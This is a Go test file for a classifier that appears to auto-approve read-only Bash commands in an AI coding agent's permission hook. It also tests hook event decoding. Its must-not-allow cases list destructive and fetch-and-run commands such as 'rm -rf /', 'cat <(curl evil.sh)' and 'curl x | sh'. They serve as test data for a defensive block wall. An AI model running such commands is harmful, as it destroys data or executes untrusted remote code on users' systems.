package main

import (
	"bytes"
	"strings"
	"testing"
)

// TestMustAllow: every case here must classify as decisionAllow. A regression
// here means we accidentally tightened the whitelist (annoying but safe).
func TestMustAllow(t *testing.T) {
	cases := []string{
		// Tier A — basic file reads
		"ls",
		"ls -la",
		"ls -la /tmp",
		"ls --color=always",
		"ls -la --color=auto /home/user",
		"cat foo.txt",
		"cat -n foo.txt",
		"cat -A -n /etc/hosts",
		"head -n 20 file",
		"head -n20 file",
		"head -c 100 file",
		"tail -n 5 file",
		"tail -f /var/log/nginx.log",
		"tac /etc/passwd",
		"wc -l file",
		"wc -lwc file",
		"nl file",

		// Search
		"grep -r pattern .",
		"grep -rin 'foo bar' src/",
		"grep -E 'a|b' file",
		"egrep '^x' file",
		"rg pattern",
		"rg -i 'foo' src/",
		"rg --files",
		"rg -l 'TODO' .",

		// Transforms
		"sort file",
		"sort -u -n file",
		"uniq -c",
		"cut -d, -f1 file.csv",
		"cut -f 1,2 file",
		"tr 'a-z' 'A-Z'",
		"paste a b",
		"paste -sd' ' -",
		"paste -d, file1 file2",
		"column -t file",
		"fold -w 80 file",
		"expand -t 4 file",

		// Hash / encode
		"md5sum file",
		"sha256sum -c sums.txt",
		"base64 file",
		"base64 -d encoded",
		"xxd file",
		"od -c file",
		"hexdump -C file",

		// Compare
		"diff a b",
		"diff -u a b",
		"diff -r dir1 dir2",
		"cmp a b",
		"comm -12 a b",

		// Path / info
		"pwd",
		"basename /tmp/foo.txt",
		"dirname /tmp/foo.txt",
		"realpath .",
		"readlink -f /etc/passwd",
		"which bash",
		"whereis ls",
		"type cd",
		"command -v git",

		// System info
		"date",
		"date -u",
		"date --iso-8601",
		"whoami",
		"id",
		"id -u",
		"uname -a",
		"uptime",
		"uptime -p",
		"env",
		"env -0",
		"printenv",
		"printenv HOME",
		"free -h",
		"ps",
		"ps aux",
		"ps -ef",
		"getent passwd demo",

		// Trivial
		"echo hello",
		"echo -n no newline",
		// Tokens that look flag-shaped but aren't: a name can't start with `-`,
		// so `---`, `----foo`, etc. are positionals (matches GNU getopt behavior).
		`echo "---"`,
		"echo ---",
		"echo ----foo",
		"echo a ---- b",
		"printf '%s\\n' x",
		"true",
		"false",
		":",

		// JSON
		"jq . file.json",
		"jq -r .name file.json",
		"jq --slurp '.' a.json b.json",

		// Tier B — git
		"git status",
		"git status -s",
		"git status --short --branch",
		"git log",
		"git log --oneline",
		"git log --oneline -20",
		"git log --graph --all --decorate",
		"git log --pretty=format:'%h %s' -10",
		"git log --since=yesterday --author=demo",
		"git show",
		"git show HEAD",
		"git show abc123",
		"git show --stat HEAD~3",
		"git diff",
		"git diff --cached",
		"git diff HEAD~3 HEAD",
		"git diff --stat",
		"git rev-parse HEAD",
		"git rev-parse --show-toplevel",
		"git ls-files",
		"git ls-files --exclude-standard",
		"git ls-tree HEAD",
		"git cat-file -p HEAD",
		"git blame README.md",
		"git describe --tags",
		"git shortlog -s -n",
		"git reflog show",
		"git grep -n TODO",
		"git -C /tmp status",
		"git -C /home/user/myrepo log --oneline -- flake.nix",
		"git -C/tmp status",

		// Tier B — jj
		"jj status",
		"jj st",
		"jj diff",
		"jj log",
		"jj log -r @",
		"jj show",
		"jj op log",
		"jj operation log",
		"jj bookmark list",
		"jj bookmark list --all",
		"jj bookmark list -a foo",
		"jj git remote list",

		// Tier B — nix
		"nix eval .#packages.x86_64-linux.default.version",
		"nix eval --raw .#foo",
		"nix show-config",
		"nix derivation show /nix/store/abc.drv",
		"nix path-info /run/current-system",
		"nix flake metadata",
		"nix flake show",
		"nix search nixpkgs hello",

		// Tier B — docker
		"docker ps",
		"docker ps -a",
		"docker images",
		"docker logs -f mycontainer",
		"docker inspect mycontainer",
		"docker version",
		"docker info",

		// Tier B — systemctl
		"systemctl status sshd",
		"systemctl is-active sshd",
		"systemctl cat sshd",
		"systemctl list-units",
		"systemctl list-units --type=service --state=running",

		// Tier C — find
		"find . -name '*.go' -type f",
		"find . -maxdepth 2 -type d",
		"find /etc -name passwd",
		"find . -mtime -1 -type f -print",
		"find -L /tmp -name foo",
		"find . -size +1M -ls",
		"find . -empty",
		"find . -name '*.tmp' -printf '%p\\n'",

		// Compound (safe AND safe / safe OR safe / safe pipeline)
		"echo hello && pwd",
		"ls /tmp || echo missing",
		"cat foo.txt | grep bar | wc -l",
		"git log --oneline | head -20",
		"ls -la | grep '^d'",
		// Multi-stage `&&` chain with a literal dash-string separator.
		`git -C /tmp log --oneline --all | wc -l && echo "---" && git -C /tmp log --oneline | head -50`,

		// Redirect to /dev/null (no-op write)
		"grep -q pattern file > /dev/null",
		"diff a b > /dev/null",

		// Input redirect (read-only)
		"grep pattern < file",

		// `--` separator
		"cat -- --weird-filename",

		// Tier D — wrappers (recursive classification)
		"devenv shell -- git status",
		"devenv shell -- ls -la",
		"devenv shell -- jj log",
		"devenv shell -- cat foo.txt",
		"devenv shell -- rg pattern",
		"devenv shell --impure -- git diff",
		"devenv shell --clean -- ls",
		"devenv shell -v --impure -- git status",
		"devenv shell -- git status 2>&1",
		"nix shell nixpkgs#hello -- cat /etc/hosts",
		"nix shell nixpkgs#hello nixpkgs#ripgrep -- rg foo",
		"nix shell --impure nixpkgs#hello -- ls",
		// Composition: wrapper inside wrapper.
		"devenv shell -- nix shell nixpkgs#ripgrep -- rg foo",

		// Tier F — xargs wrapping a curated read-only command
		"xargs wc -l",
		"git ls-files | xargs wc -l",
		"xargs cat",
		"xargs md5sum",
		"xargs grep -n pattern",
		"xargs -0 wc -l",
		"xargs -n1 stat",
		"xargs -r -t head -n5",
		"xargs wc -l 2>/dev/null",
		"xargs -- wc -l", // explicit end-of-flags before the command
		"xargs ls",       // ls is ArgvDataSafe (no write flag), so wrappable
		"xargs echo",     // echo too
		"xargs readlink -f",
		// The full motivating pipeline.
		"git ls-files 'app/**/*.php' | xargs wc -l 2>/dev/null | sort -rn | head -15",

		// Tier E — awk with whitelisted constructs only
		"awk '{print}'",
		"awk '{print $2}'",
		"awk '{print $2, $11, $12}'",
		"awk '/pattern/'",
		"awk '/pattern/ {print}'",
		"awk 'BEGIN {x=1} {print x, $1}'",
		"awk 'END {print NR}'",
		"awk -F: '{print $1}' /etc/passwd",
		"awk -F : '{print $1}' /etc/passwd",
		"awk -v n=5 '{if (NR<=n) print}'",
		"awk -v sep=, -F: '{print $1 sep $2}'",
		"awk '/x/ {gsub(/y/,\"z\"); print}'",
		"awk '{for (i=1;i<=NF;i++) print $i}'",
		"awk '{n=split($0,a,\",\"); for (i=1;i<=n;i++) print a[i]}'",
		"awk '{s=substr($1,1,5); print toupper(s)}'",
		"awk 'NR>1 {print $0}'",
		"awk '$1 == \"foo\" {print $2}'",
		// Awk inside pipelines (whole pipeline must classify).
		"ps aux | awk '{print $2}' | head",
		"git log --pretty=format:%H | awk 'NR<=10'",

		// cd builtin — Tier A. Only effect is chdir on this shell invocation.
		"cd /tmp",
		"cd",
		"cd /a /b", // bash itself errors on extras; classifier needn't enforce arity
		"cd /tmp && jj status",
		"cd /home/user && git log --oneline",

		// Subshells — recurse into contained statements; same rule as && / ||.
		"(jj status)",
		"(jj status || git status)",
		"(jj status 2>/dev/null || git status 2>/dev/null)",
		"(cd /tmp && ls)", // was mustNotAllow before Subshell recursion + cd landed
		"cd /home/user/project && (jj status 2>/dev/null || git status 2>/dev/null)",

		// Command substitution — quoted $(...) with a read-only inner command,
		// handed to an ArgvDataSafe outer command as an opaque positional.
		`echo "x $(ls)"`,
		`echo "$(cat /etc/hostname)"`,
		`cat "$(readlink -f /etc/os-release)"`,
		`echo "prefix-$(basename /a/b/c)-suffix"`,
		`echo "$(head -1 /etc/os-release)"`,
		`ls "$(dirname /a/b/c)"`,
		`echo "$(head -1 "$(ls)")"`, // nested substitution; both inners read-only
		`grep foo "$(readlink -f /etc/os-release)"`,
		`echo "a" "$(ls)" "b"`, // substituted operand among literals
		// An `=`-embedded substitution is one opaque token; safe for an
		// ArgvDataSafe command since any argv (even flag-shaped) is harmless.
		`ls --color="$(ls)"`,
		"echo \"`ls`\"",                         // backquote spelling of $(...), read-only inner
		`echo "$(ls && cat /etc/hostname)"`,     // compound inner, every stage read-only
		`echo "$(cat /etc/hostname | head -1)"`, // inner pipeline, every stage whitelisted
	}
	for _, c := range cases {
		if got := classifyCommand(c); got != decisionAllow {
			t.Errorf("classifyCommand(%q) = %v, want Allow", c, got)
		}
	}
}

// TestMustNotAllow is the safety wall: every case here is UNSAFE — allowing it
// would auto-approve a write, exec, network call, or otherwise-unverifiable side
// effect. Each must classify as decisionFallThrough. A regression here is a real
// security problem. (Contrast TestNotYetAllowed: forms that are harmless as
// written and fall through only because a classifier feature isn't built yet — a
// regression there is a scope change to review, not an incident.)
func TestMustNotAllow(t *testing.T) {
	cases := []string{
		// Direct writes / mutates
		"rm foo",
		"rm -rf /tmp/foo",
		"mv a b",
		"cp a b",
		"chmod 777 x",
		"chown user x",
		"mkdir foo",
		"touch foo",
		"ln -s a b",
		"dd if=/dev/zero of=x",
		"truncate -s 0 file",

		// Script-language commands (deliberately not in whitelist). The read-only
		// sed forms (sed -n / sed s///) are safe-but-deferred → TestNotYetAllowed.
		"sed -i 's/x/y/' file", // -i writes in place
		"perl -pe 's/x/y/' file",
		"perl -i -pe 's/x/y/' file",
		"python -c 'print(1)'",
		"ruby -e 'puts 1'",
		"node -e 'console.log(1)'",
		"bash -c 'rm x'",
		"sh -c 'echo hi'",

		// awk with unsafe constructs in the script body
		"awk '{print > \"out\"}'",
		"awk '{print >> \"out\"}'",
		"awk '/x/ {print > \"out\"}' file",
		"awk '/x/ {print > \"/etc/hosts\"}'",
		"awk '{printf \"%s\\n\", $1 > \"out\"}'",
		"awk '{print | \"sh\"}'",
		"awk '{print | \"cat > /tmp/x\"}'",
		"awk '{system(\"id\")}'",
		"awk 'BEGIN {system(\"rm -rf /\")}'",
		"awk '{\"echo hi\" | getline x; print x}'",
		"awk '{getline x < \"/etc/passwd\"; print x}'",
		"awk '{fflush()}'",                     // F_FFLUSH not on allowlist
		"awk '{close(\"foo\")}'",               // F_CLOSE not on allowlist
		"awk 'function foo() {print} {foo()}'", // user-defined function
		"awk 'function foo(x) {return x+1} {print foo($1)}'",
		// awk CLI shapes outside the v1 whitelist
		"awk -f script.awk",
		"awk -f /tmp/x.awk input",
		"awk -i include.awk '{print}'",         // gawk -i (include file)
		"awk --field-separator=: '{print $1}'", // long flags not in v1
		"awk -e '{print}'",                     // multi-program form, deferred
		"awk --unknown-flag '{print}'",

		// tar — not whitelisted at all. The read-only list form (tar -tf) is
		// safe-but-deferred → TestNotYetAllowed.
		"tar -xf archive.tar",
		"tar -czf out.tar src/",

		// curl / wget / tee / dd — not whitelisted
		"curl https://example.com",
		"curl -fsSL https://example.com",
		"wget https://example.com",
		"echo hi | tee /etc/hosts",
		"ls | tee output.txt",

		// xargs: command not in the curated wrappable set, or unsafe form.
		"xargs rm",              // rm not whitelisted at all
		"xargs -I{} echo {}",    // replace-mode flag not whitelisted
		"xargs",                 // no wrapped command (bare xargs → /bin/echo)
		"xargs sort",            // sort has -o write flag → not wrappable (stdin could inject -o)
		"xargs git",             // git push reachable via stdin → not wrappable
		"xargs date",            // date -s sets the clock via stdin → not wrappable
		"xargs jq .",            // jq -i in-place via stdin → not wrappable
		"xargs uniq",            // uniq has positional OUT-file write → not ArgvDataSafe
		"xargs --replace wc -l", // replace-mode long form not whitelisted
		"xargs --max-procs",     // value-taking flag missing its value
		"xargs cat > out.txt",   // redirect write caught structurally

		// Whitelisted command + unknown flag → fall through
		"cat --futurewriteflag foo",
		"ls --new-flag-not-in-whitelist",
		"head --unknown",
		"grep --some-new-thing foo file",

		// Whitelisted command + known-unsafe-omitted flag
		"sort -o out.txt in.txt",       // -o (output) intentionally omitted
		"sort --output=out.txt in.txt", // --output intentionally omitted
		"hostname newname",             // hostname doesn't AllowAnyPositional
		"env CMD",                      // env doesn't allow positional commands

		// find with omitted-on-purpose flags
		"find . -delete",
		"find . -exec rm {} +",
		"find . -exec rm {} \\;",
		"find . -execdir rm {} +",
		"find . -ok rm {} \\;",
		"find . -fprint out.txt",
		"find . -fprintf out.txt '%p'",
		"find . -fls out.txt",
		"find . -not -empty", // operators not in v1
		"find . -name foo -or -name bar",
		"find . -newunknownflag",

		// git subcommands outside the whitelist (have write modes)
		"git push",
		"git push --force",
		"git pull",
		"git fetch",
		"git checkout main",
		"git checkout -- file",
		"git switch main",
		"git restore .",
		"git add .",
		"git commit -m msg",
		"git merge feature",
		"git rebase main",
		"git reset --hard HEAD~1",
		"git clean -fd",
		"git branch -D foo",
		"git tag v1.0.0",
		"git config user.email x@y",
		"git remote add origin x",
		"git stash",
		"git worktree add ../wt",

		// git-level flags not in v1
		"git --git-dir=/tmp/.git log",
		"git -C",
		"git -C /tmp",
		"git -X /tmp status",

		// jj subcommands outside whitelist
		"jj new",
		"jj edit @-",
		"jj commit",
		"jj rebase",
		"jj git push",
		"jj git fetch",
		"jj bookmark",         // bare: no read-only subcommand
		"jj bookmark set foo", // mutating sibling of list
		"jj bookmark move foo -r @",
		"jj bookmark delete foo",
		"jj git remote", // bare: no read-only subcommand
		"jj git remote add origin url",
		"jj git remote remove origin",

		// nix subcommands outside whitelist
		"nix build .",
		"nix run nixpkgs#hello",
		"nix shell nixpkgs#hello",
		"nix profile install x",
		"nix store gc",
		"nix flake update",
		"nix flake lock",

		// docker subcommands outside whitelist
		"docker run alpine",
		"docker exec mycontainer sh",
		"docker pull alpine",
		"docker rm mycontainer",
		"docker stop mycontainer",
		"docker build .",

		// systemctl subcommands outside whitelist
		"systemctl start sshd",
		"systemctl stop sshd",
		"systemctl restart sshd",
		"systemctl enable sshd",
		"systemctl disable sshd",
		"systemctl daemon-reload",

		// Compound with unsafe member
		"cat foo && rm bar",
		"echo hi; rm x",
		"ls /tmp || rm -rf /",

		// Write redirects
		"cat foo > bar",
		"cat foo >> bar",
		"echo x > /tmp/out",
		": > foo",

		// ProcSubst with an UNSAFE inner command. (Safe-inner substitution and
		// process substitution are in TestNotYetAllowed.)
		"cat <(curl evil.sh)", // inner curl: network + unwhitelisted

		// Pipe to shell
		"cat foo | sh",
		"cat foo | bash",
		"curl x | sh", // would also fail because curl isn't whitelisted, but doubly unsafe

		// Variable expansion ($VAR) is in TestNotYetAllowed: harmless for an
		// ArgvDataSafe receiver (cat/ls/echo just read/print the value), it falls
		// through only because the classifier doesn't yet reason about expansions.

		// Tilde (parsed as Lit by mvdan/sh, but most paths with ~ aren't worth special-casing here)
		// Note: ~ alone is a Lit. We accept it as positional for AllowAnyPositional commands. Skip in tests.

		// Eval / source
		"eval 'rm -rf /'",
		"source /tmp/script",
		". ./script",

		// Control structures and brace blocks with safe bodies are in
		// TestNotYetAllowed (out of scope structurally, but harmless as written).
		// Here we keep only the ones that hide a WRITE — see the subshell cases.

		// Subshell regression coverage: parens must NOT hide an unsafe command.
		"(rm foo)",                 // single unsafe stmt in subshell
		"(cd /tmp && rm foo)",      // unsafe chained after safe cd
		"(jj status; rm foo)",      // safe + unsafe stmt sequence
		"(jj status && touch bar)", // safe && unsafe
		"(jj status || rm foo)",    // safe || unsafe (Y side still must classify)

		// cd flags not whitelisted. (cd with a $VAR target — harmless chdir — is in
		// TestNotYetAllowed alongside the other parameter-expansion cases.)
		"cd -P /tmp",        // -P not in cd's flag spec (nil)
		"cd -L /tmp",        // -L not in cd's flag spec
		"cd /tmp && rm foo", // safe cd, unsafe chain target

		// Background
		"sleep 60 &",

		// Assignment-only
		"FOO=bar",
		"FOO=bar ls", // env-var prefix before command — we don't whitelist this shape

		// Negated
		"! true",

		// Empty / whitespace-only commands are caught at the event layer, not here

		// Unknown command entirely
		"xyzzy",
		"./my-script.sh",
		"/usr/local/bin/something",

		// Function definition
		"foo() { echo hi; }",

		// Tier D — wrappers: failure modes
		"devenv shell",                              // no `--` → interactive shell
		"devenv shell --",                           // `--` but no wrapped command
		"devenv shell -- rm foo",                    // rm not whitelisted
		"devenv shell -- bash -c 'echo hi'",         // bash not whitelisted
		"devenv shell -- quarto render foo.qmd",     // quarto not whitelisted
		"devenv shell -- git push",                  // git push not whitelisted
		"devenv shell --unknown-flag -- git status", // unknown pre-sep flag
		"devenv shell foo -- git status",            // positional before `--`, devenv shell takes none
		"devenv shell --run 'echo x'",               // --run-style flag not in spec
		"devenv up -- ls",                           // wrong subcommand
		"devenv shell -- $(whoami)",                 // non-literal wrapped command
		// nix shell wrapper failure modes
		"nix shell -- git push",                // wrapped write
		"nix shell -- rm foo",                  // wrapped write
		"nix shell --run 'rm x' nixpkgs#hello", // --run not whitelisted on nix shell

		// Command substitution — UNSAFE forms (a side effect if allowed). The
		// safe-but-deferred forms (e.g. `sort "$(ls)"`) live in TestNotYetAllowed.
		`$(echo ls)`,                        // substitution in command-name position: command unknowable
		`$(echo ls) -l`,                     // ditto, with args
		`"$(ls)"`,                           // whole command name is a substitution
		`echo "$(rm foo)"`,                  // inner command not read-only
		`echo "$(git push)"`,                // inner command not read-only
		`echo "$(cat /etc/x | sed s/a/b/)"`, // inner pipeline has a non-whitelisted stage
		`echo "$(ls && rm x)"`,              // inner compound: one stage not read-only
		`echo "$(ls; rm x)"`,                // inner list: one stage not read-only
		`echo "$(ls)$(rm x)"`,               // two substitutions in one word, one unsafe
		`sort --output="$(ls)"`,             // substituted value feeds a write flag → write
		`cat "$(ls)" > /etc/passwd`,         // redirect write not masked by the substitution
	}
	for _, c := range cases {
		if got := classifyCommand(c); got != decisionFallThrough {
			t.Errorf("classifyCommand(%q) = %v, want FallThrough", c, got)
		}
	}
}

// TestNotYetAllowed holds commands that are SAFE as written — read-only, no side
// effect — yet still classify as decisionFallThrough today, only because a
// classifier feature isn't built. They are not part of the safety wall: a
// regression here (a case starting to classify Allow) is the EXPECTED outcome when
// the corresponding feature lands, at which point the case should move up to
// TestMustAllow. The asymmetry to preserve: a case belongs here ONLY if you can
// show it is genuinely harmless in this exact form; when in doubt, it goes in
// TestMustNotAllow. The comment on each case names the deferred feature.
//
// See FUTURE-WORK.md for the feature designs (command-substitution tiers, $VAR
// expansion, control structures, a sed parser).
func TestNotYetAllowed(t *testing.T) {
	cases := []string{
		// Command substitution — safe operand, rule not yet relaxed.
		`sort "$(ls)"`,            // read-only input file; Tier 2 (needs a literal --)
		`uniq "$(ls)"`,            // a single positional is read-only (only IN, no OUT)
		`jj log "$(ls)"`,          // jj log REVSET is read-only; subcommand positionals not wired
		`find . -name "$(ls)"`,    // -name PATTERN is a read-only predicate (a flag argument)
		`head -n "$(ls)" file`,    // -n COUNT on an ArgvDataSafe reader; substituted flag arg
		"echo \"$(ls `whoami`)\"", // inner is read-only, but uses an unquoted backquote subst

		// Unquoted command substitution / process substitution — safe inner.
		`echo $(ls)`,           // unquoted: would need unquoted-for-ArgvDataSafe handling
		`echo $(whoami)`,       // ditto
		"echo `whoami`",        // backquote spelling, unquoted
		`diff <(ls a) <(ls b)`, // process substitution; both inners read-only

		// Parameter expansion $VAR — harmless for an ArgvDataSafe / read-only receiver.
		"cat $FOO",
		"ls $HOME",
		`ls "$HOME"`,
		"echo ${PATH}",
		`echo "${HOME}"`,
		"cd $HOME", // only effect is a chdir, harmless for any target
		`cd "$HOME"`,

		// Control structures / brace blocks with safe bodies — structurally out of
		// scope, but these exact forms only read/print.
		"if true; then echo x; fi",
		"for f in *; do echo $f; done",
		"while read l; do echo $l; done",
		"case $x in a) echo a;; esac",
		"{ ls; pwd; }",

		// Read-only forms of unwhitelisted script/archive tools.
		"sed -n '1,10p' file", // print a line range to stdout
		"sed 's/a/b/' file",   // substitute to stdout (no -i)
		"tar -tf archive.tar", // list archive contents
	}
	for _, c := range cases {
		if got := classifyCommand(c); got != decisionFallThrough {
			t.Errorf("classifyCommand(%q) = %v, want FallThrough (a deferred-safe case "+
				"started allowing — if a feature landed, move it to TestMustAllow)", c, got)
		}
	}
}

// TestEventDecodeContractViolations: every case must produce a non-nil error
// from decodeEvent. main.go converts that into a fail-loud exit; here we just
// verify the error contract.
func TestEventDecodeContractViolations(t *testing.T) {
	cases := []struct {
		name string
		body string
	}{
		{"malformed JSON", `not json`},
		{"truncated", `{"foo":`},
		{"unknown top-level field", `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls"},"extra":1}`},
		{"unknown nested field", `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls","extra":1}}`},
		{"wrong event name", `{"hook_event_name":"PostToolUse","tool_name":"Bash","tool_input":{"command":"ls"}}`},
		{"wrong tool name", `{"hook_event_name":"PreToolUse","tool_name":"Read","tool_input":{"command":"ls"}}`},
		{"missing command", `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{}}`},
		{"empty command", `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":""}}`},
		{"whitespace command", `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"   \t\n"}}`},
		{"trailing data", `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls"}}{"extra":true}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			_, err := decodeEvent(strings.NewReader(c.body))
			if err == nil {
				t.Fatalf("decodeEvent(%q): want error, got nil", c.body)
			}
			if strings.TrimSpace(err.Error()) == "" {
				t.Errorf("decodeEvent(%q): error message is empty", c.body)
			}
		})
	}
}

// TestEventDecodeAccepts: valid events round-trip successfully, including the
// full real-world event shape with all known Claude Code context fields.
func TestEventDecodeAccepts(t *testing.T) {
	cases := []string{
		// Minimal valid event (every required field, no context fields).
		`{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls"}}`,
		`{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"git status -s"}}`,
		// Real Claude Code v2.1.119 event shape (captured from a live session).
		`{"session_id":"abc-uuid","transcript_path":"/path/to/transcript.jsonl","cwd":"/home/user/repo","permission_mode":"default","hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls","description":"List files"},"tool_use_id":"toolu_xyz"}`,
		// With Bash tool's optional timeout / run_in_background fields.
		`{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"sleep 5","timeout":10000,"run_in_background":false}}`,
		// Newer Claude Code adds an optional model-supplied per-call effort
		// field in tool_input (alongside description/timeout/run_in_background).
		// Without it enumerated, the strict decoder exits 2 and blocks the call.
		`{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls","effort":"high"}}`,
		// With "effortLevel" set in settings.json, the harness also attaches a
		// per-call effort field at the TOP LEVEL of the event (not just inside
		// tool_input). Without it enumerated on `event`, the strict decoder
		// exits 2 and blocks EVERY Bash call.
		`{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls"},"effort":"high"}`,
		// Sub-agent Bash calls include agent_id + agent_type fields; without
		// these in the schema the strict decoder exits 2 on every sub-agent
		// tool call.
		`{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls"},"agent_id":"ad50092edde64eaef","agent_type":"Explore"}`,
	}
	for _, body := range cases {
		ev, err := decodeEvent(strings.NewReader(body))
		if err != nil {
			t.Errorf("decodeEvent(%q): unexpected error %v", body, err)
			continue
		}
		if ev.HookEventName != "PreToolUse" || ev.ToolName != "Bash" {
			t.Errorf("decodeEvent(%q): wrong fields %+v", body, ev)
		}
	}
}

// Silence unused-import warnings in case future refactors drop one.
var _ = bytes.NewReader
